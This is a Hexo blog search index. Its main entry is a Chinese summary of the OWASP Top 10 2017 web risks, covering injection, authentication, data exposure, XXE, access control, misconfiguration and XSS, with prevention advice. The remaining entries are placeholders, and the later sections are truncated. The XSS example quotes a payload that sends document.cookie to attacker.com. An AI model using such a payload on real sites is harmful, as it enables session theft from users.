<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[1]]></title>
    <url>%2F2018%2F08%2F26%2F1%2F</url>
    <content type="text"><![CDATA[10项最严重的web应用程序安全风险A1:2017 注入 LDAP是轻量目录访问协议 脆弱并容易受攻击的状态 用户提供的数据没有经过应用程序的验证、过滤或净化。 动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。 在ORM搜素参数中使用了恶意数据，这样搜索就获得包含敏感或未授权的数据。 恶意数据直接被使用或连接，诸如SQL语句或命令动态查询语句、命令或存储过程中包含结构和恶意数据。 如何防止防止注入漏洞需要将数据与命令语句、查询语句分割开来 最佳的选择是使用安全的API，完全避免使解释器，或提供参数化界面的接口，或迁徙到ORM或实体框架。 注意：当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL将查询和数据连接在一起，或者执行带有立即执行，或exec（）的恶意数据。 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符，OWASP的Encoder 和 类似的库提供了这样的转义例程。 注意：SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的，这是编写软件中的一个常见问题。 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量的泄露记录。 A2：失效的身份认证 应用描述：攻击者可以获得数百万的有效用户名和密码组合，包括证书填充、默认的管理账户列表、自动的暴力破解和字典攻击工具，以及高级的GPU破解工具，会话管理攻击很容易被理解，尤其是没有过期的会话密钥。 安全弱点：大多数身份和访问管理系统的设计和实现，普遍存在身份认失效问题。会话管理是身份认证和访问控制的基础，并且存在于所有状态应用程序中。攻击者可以使用指南手册来检测失效的身份验证，但通常会关注密码转储，字典攻击，或者在类似于钓鱼或社会工程攻击之后，发现失效的身份认证。 技术：攻击者只需要访问几个账户，或者只需要一个管理员账户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺以及用户身份盗窃，泄露法律高度保护的敏感信息。 身份验证应用程序脆弱 允许凭证填充，这使得攻击者获得有效用户名和密码的列表。 允许暴力破解或其他自动攻击。 允许默认的、弱的或众所周知的密码。 使用弱的或失效的验证凭证，忘记密码程序。 使用明文，加密或弱散列密码。 缺少或失效的多因素身份认证。 暴露URL中的会话ID。 在成功登陆后不会更新会话ID。 不正确的使会话ID失效，当用户不活跃的时候，用户会话或认证令牌（特别是单点登陆（SSO）令牌），没有正确注销或失效。 防止 在可能的情况下，实现多因素身份认证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。不要使用发送或部署默认的凭证，特别是管理员用户。 执行密码弱检查。 将密码长度、复杂性、和循环策略，或其他现代的基于证据的密码策略相一致。 确认注册、凭据回复、和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。 限制或逐渐延迟失败的登陆尝试，记录所有失败信息，并在凭据填充，暴力破解，或其他攻击被检测时提醒管理员。 使用服务器端安全的内置会话管理器，在登陆后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。 案例场景 凭证填充，使用已知密码的列表，是常见的攻击。如果应用程序不限制身份验证尝试，则可以将应用程序用作密码oracle，以确定凭证是否有效。 大多数身份验证攻击都是由于使用密码作为唯一的因素。依据最佳实践，最新的密码轮换和复杂性要求鼓励用户使用、重用以及重用弱密码。建议组织在NIST-800-63中停止这些实践，并使用多因素身份认证。 应用会话超时时设置不正确，用户使用公共计算机访问应用程序。用户直接关闭浏览器选项卡就离开。而不是选择“注销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户状态仍然是经过身份认证。 A3：敏感数据泄露 应用描述：攻击者不是直接攻击密码，而是在传输过程中或从客户端窃取密钥、发起中间人攻击，或从服务器端窃取明文数据。这通常需要手动攻击。通过使用图形处理单元（GPU）,早前检索的密码数据库可能被暴力破解。 安全弱点：这个领域最常见的漏洞是不对敏感信息进行加密，在数据加密过程中，常见的问题是： 不安全的密钥生成和管理 使用弱加密算法、弱协议和弱密码。 使用弱的哈希算法来保护密码 检测传输过程中的数据弱点很容易，但检测存储数据的弱点却非常困难。 业务 弱点确认需要被加密的敏感数据 是否使用明文传输？这和传输协议相关，如：HTTP，SMTP，FTP。外部网络流量非常危险。验证所有的内部通信，如：负载平衡器，web服务器，或后端系统之间的通信。 数据被存储时，是否被加密，是否有备份数据。 源码，是否使用旧的或脆弱的加密算法。 是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转。 是否强制加密敏感数据。 用户代理是否验证服务器端证书的有效性。 防止 对系统处理、存储或传输的数据分类，并根据分类进行访问控制。 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据。 对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过PCIDSS标记或拦截，未存储的数据不能被窃取。 确保存储的所有敏感数据被加密。 确保使用了最新的、强大的标准算法或密码、参数、协议和密钥，并且密钥管理到位。 确保传输过程中的数据被加密。 禁止缓存对包含敏感数据的响应。 确保使用密码专用算法存储密码。将工作因素设置在可接受范围。 单独验证每个安全配置项的有效性。 攻击案例1.一个应用程序使用自动化的数据加密系统加密信用卡信息，并存储在数据库中。但是，当数据被检索时自动解密，这就使得SQL注入漏洞能够以明文形式获得所有信用卡卡号。1.网站上对所有网页没有使用或强制使用TLS，或者使用弱加密，攻击者通过监测网络流量，将网络连接从HTTPs降级到HTTP，就可以截取请求并窃取用户会话cookie。之后，攻击者可以复制用户cookie并成功劫持经过认证的用户会话，访问或修改用户个人信息。除此之外，攻击者还可以更改所有传输过程中的数据。1.密码数据库使用未加密的哈希算法或弱哈希算法去存储每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所有这些未加密哈希的密码通过彩虹表暴力破解。由简单或快速散列函数生成加密的哈希，也可以通过GPU破解。 A4：XML外部实体（XXE） 应用描述：如果攻击者可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项或集成，他们就能够攻击含有缺陷的XML处理器。 安全弱点：默认情况下，许多旧的XML处理器能够对外部实体、XML进程中被引用和评估的URL进行规范。 SAST工具可以通过检查依赖项和安全配置来发现XXE缺陷。DAST工具需要额外的手动步骤来检测和利用XXE缺陷。因为XXE漏洞测试在2017年并不常见，因此手动测试人员需要通过接受培训来了解如何进行XXE漏洞测试。 业务：XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。业务影响取决于所有受影响的应用程序和数据保护需求。 应用的弱点 应用直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件，并提交给XML处理器解析。 在应用程序或基于web服务的SOAP中，所有XML处理器都启用了文档类型定义DTDS，因为禁用DTD进程的确切机制因处理器而不同。 如果为了实现安全性或单点登录（SSO），您的应用使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用就容易受到XXE攻击。 如果您的应用使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。 存在XXE缺陷的应用更容易受到拒绝服务攻击，包括：Billion Laughs攻击。 防止XXE缺陷 尽可能使用简单的数据格式，避免对敏感数据进行序列化。 即使修复或更新应用或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。 在应用的所有XML解析器中禁用XML外部实体和DTD进程。 在服务器端实施积极的“白名单”输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。 尽管在许多集成环境中，手动代码审查是大型、复杂应用的最佳选择，但是SAST工具可以检测源代码中的XXE漏洞。 如果无法实现这些控制，请考虑使用虚拟修复程序、API安全网关或web应用防火墙（WAF）来检测、监控和防止XXE攻击。 攻击案例大量XXE缺陷已经被发现并被公开，这些缺陷包括嵌入式设备的XXE缺陷。XXE缺陷存在于许多意想不到的地方，这些地方包括深嵌套的依赖项。最简单的方法是上传可被接受的恶意XML文件： 攻击者尝试从服务器端提取数据： 攻击者通过将上面的实体行更改为以下内容来探测服务器的专用网络 攻击者通过恶意文件执行拒绝服务攻击： A5:失效的访问控制 应用描述：对访问控制的利用是渗透测试人员的一项核心技能。SAST工具和DAST工具可以检测到访问控制的缺失，但不能验证其功能是否正常。访问控制可通过手动方式检测，或在某些特定框架下通过自动化检测访问控制缺失。 安全弱点：由于缺乏自动化的检测和应用开发人员缺乏有效的功能测试，因而访问控制缺陷很正常。访问控制检测通常不适用于自动化的静态或动态测试。手动测试是检测访问控制缺失或失效的最佳方法，包括：HTTP方法（如：GET和PUT）、控制器、直接对象引用等。 业务：技术影响是攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。业务影响取决于应用和数据的保护需求。 应用脆弱访问控制强制实施策略，使用户无法在其预期的权限之外执行行为。失败的访问控制通常导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。常见的访问控制脆弱性包括： 通过修改URL、内部应用状态或HTML页面绕过访问控制检查，或简单地使用自定义的API攻击工具。 允许将主键更改为其他用户的记录，例如查看或编辑他人的账户。 特权提升。在不登陆的情况下假扮用户，或以用户身份登陆时充当管理员。 元数据操作，如重放或篡改JWT访问控制令牌，或作以提升权限的cookie或隐藏字段。 CORS配置错误允许未授权的API访问。 以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面、或作为标准用户访问具有相关权限的页面、或API没有对POST、PUT和DELETE强制执行访问控制。 防止访问控制只有在受信服务器端代码或没有服务器的API中有效，这样攻击者才无法修改访问控制检查或元数据。 除公有资源外，默认情况下拒绝访问。 使用一次性的访问控制机制，并在整个应用中不断重用他们，包括最小化CORS使用。 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。 域访问控制对每个应用都是唯一的，但业务限制要求应由域模型强制执行。 禁用web服务器目录列表，并确保文件元数据不存在于web的根目录中。 记录失败的访问控制，并在适当时向管理员告警。 对API和控制器的访问进行了速率限制，以最大限度地降低自动化攻击工具的危害。 当用户注销后，服务器上的JWT令牌应失效。 攻击案例 应用在访问账户信息的SQL调用中使用了未经验证的数据。攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何账号信息。如果没有正确验证，攻击者可以访问任何用户的账户。 攻击者仅强制浏览目标URL，管理员权限是访问管理页面所必需的。 如果一个未经身份验证的用户可以访问任何页面，那么这是一个缺陷。如果一个非管理员权限的用户可以访问管理页面，那么这同样也是一个缺陷。 A6：安全配置错误 应用描述通常，攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。 安全弱点：安全配置错误可以发生在一个应用程序堆栈的任何层面，包括网络服务、平台、web服务器、应用服务器、数据库、框架、自定义代码和预安装的虚拟机、容器和存储。自动扫描器可用于检测错误的安全配置、默认账户的使用或配置、不必要的服务、遗留选项等。 业务这些漏洞使攻击者能经常访问一些未授权的系统数据或功能。有时，这些漏洞导致系统的完全攻破。业务影响取决于您的应用程序和数据的保护需求。 应用弱点： 应用程序堆栈的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。 应用程序启用或安装了不必要的功能。 默认账户的密码仍然可用且没有更改。 错误处理机制向用户披露堆栈或其他大量错误信息。 对于更新的系统，禁用或不安全地配置最新的安全功能。 应用服务器、应用程序框架、库文件、数据库等没有进行安全配置。 服务器不发送安全标头或指令，或者未对服务器进行安全配置。 您的应用已过期或易受攻击。 缺少一个体系的、可重复的应用安全配置过程，系统将处于高风险中。 防止安全的安装过程： 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。这个 过程应该是自动化的，以尽量减少安装一个新安全环境的耗费。 搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和实例。移除或不安装不适用的功能和框架。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分。在检查过程中，应特别注意云存储权限。 一个能在组建和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。 向客户端发送安全指令： 在所有环境中能够进行正确安全配置和设置的自动化过程。 攻击案例1.应用服务器附带了未从产品服务器中删除的应用。1.1. A7：跨站脚本（XSS） 应用描述：自动化工具能够检测并利用所有的三种XSS形式，并且存在方便攻击者利用漏洞的框架。 安全弱点:XSS是OWASP Top10中第二普遍存在的安全问题，存在于近三分之二的应用中。自动化工具能自动发现一些XSS问题，特别是在一些成熟的技术中，如：PHP、J2EE或JSP、ASP.NET。 技术：XSS对于反射和DOM的影响是中等的，而对于存储的XSS，XSS的影响更为严重，譬如在受攻击者的浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。 应用脆弱性：存在三种XSS类型，通常针对用户的浏览器： 反射式XSS：应用或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分，一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如：恶意漏洞网站，广告或类似类容。 存储式XSS：你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。存储型XSS一般被认为是高危或严重的风险。 基于DOM的XSS：会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript API。 典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、对用户浏览器的攻击者（例如：恶意软件下载、键盘记录）以及其他用户侧的攻击。 防止防止XSS需要将不可信数据与动态的浏览器内容区分开。这可以通过如下步骤实现： 使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0 或 React JS。了解每个框架的XSS保护的局限性，并适当地处理未覆盖的用例。 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、JavaScript、CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义。 在客户端修改为浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况下不能避免，可以采用《OWASP Cheat Sheet DOM based XSS Prevention》 使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果不存在可以通过本地文件防止恶意代码的其他漏洞（例如：路径便利覆盖和允许在网络中传输的易受攻击的库），则该策略是有效的。 攻击案例 应用在下面HTML代码段的构造中使用未经验证或转义的不可信的数据：（String） page += ““;攻击者在浏览器中修改”CC”参数为如下值：‘&gt;docunment.location=’http://www.attacker.com/cgi-bin/cookie.cgi? foo=’+document.cookie‘.这个攻击导致受害者的会话ID被发送到攻击者的网站，使得攻击者能够劫持用户当前会话。 注意：攻击者同样能使用跨站脚本攻破应用可能使用的任何跨站请求伪造（CSRF）防御机制。 A8：不安全的反序列化 应用描述： A9：使用含有已知漏洞的组件A10：不足的日志记录和监控]]></content>
  </entry>
  <entry>
    <title><![CDATA[123]]></title>
    <url>%2F2018%2F08%2F26%2F123%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F08%2F14%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
